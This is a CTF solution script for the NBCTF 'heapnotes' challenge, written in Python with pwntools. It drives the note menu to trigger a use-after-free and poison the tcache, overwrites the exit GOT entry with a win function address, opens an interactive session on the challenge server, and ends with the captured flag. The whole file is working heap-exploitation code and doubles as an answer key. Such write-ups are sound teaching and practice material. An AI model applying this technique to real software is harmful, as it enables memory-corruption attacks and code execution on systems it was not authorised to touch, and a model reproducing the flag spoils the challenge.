from pwn import *


# UAF with win function => tcache poisoning (no safe-linking)
# overwrite exit @got with  win address



win_address = 0x0000000000401276
exit_got_plt = 0x404068


def create_note(desc,value):
    desc.sendline(b'1')
    desc.sendline(value)

def modify_note(desc,index,value):
    desc.sendline(b'3')
    desc.sendline(index)
    desc.sendline(value)

def delete_note(desc,index):
    desc.sendline(b'4')
    desc.sendline(index)


def exit_prog(desc):
    desc.sendline(b'5')


#p = process("./heapnotes_patched")
p = remote("chal.nbctf.com",30172)

create_note(p,b'A'*16)
create_note(p,b'B'*16)

delete_note(p,b'0')
delete_note(p,b'1')


modify_note(p,b'1',p64(exit_got_plt)) # modify chunk "next" with exit.got.plt address

create_note(p,b'A'*16)
create_note(p,p64(win_address)) # new allocated chunk points now on exit got.plt

exit_prog(p)

# gdb.attach(p)

p.interactive()


# nbctf{b4Bys_f1R5T_h34P_12b8a0}